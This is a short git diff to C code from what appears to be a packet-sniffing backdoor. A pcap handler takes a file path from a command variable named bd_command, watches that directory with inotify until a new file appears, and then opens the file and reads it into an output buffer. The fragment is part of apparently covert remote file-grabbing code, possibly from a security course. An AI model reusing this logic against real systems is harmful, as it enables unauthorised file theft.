@@ -648,9 +648,15 @@ void server_packet_handler(u_char *args, const struct pcap_pkthdr *header, const
 
         char file_path[1024] = {0};
         strncpy(file_path, bd_command + 6, 1024);
-
         printf("File path: %s\n", file_path);
-
+        
+        // Watch file path
+        char file_name[1024] = {0};
+        inot(file_name, file_path);
+        
+        strncat(file_path, file_name, 1024 - strlen(file_path));
+        printf("Full path: %s\n", file_path);
+        
         FILE *fp;
         if((fp = fopen(file_path, "r")) == NULL){
             strcpy(output, "File not found...");
@@ -796,7 +802,9 @@ void server_packet_handler(u_char *args, const struct pcap_pkthdr *header, const
 }
 /*
 | ------------------------------------------------------------------------------
-| inotify function to return filename
+| Watch directory with inotify
+| 
+| Watches filePath and sets fileName to the name of the first file that returned an event
 | ------------------------------------------------------------------------------
  */
 
@@ -824,7 +832,7 @@ void inot(char *fileName, char* filePath) {
 
     /*actually read return the list of change events happens. Here, read the change event one by one and process it accordingly.*/
     while (i < length) {
-        struct inotify_event *event = (struct inotify_event *) &buffer[ i ];
+        struct inotify_event *event = (struct inotify_event *)&buffer[i];
         if (event->len) {
             if (event->mask & IN_CREATE) {
                 if (event->mask & IN_ISDIR) {
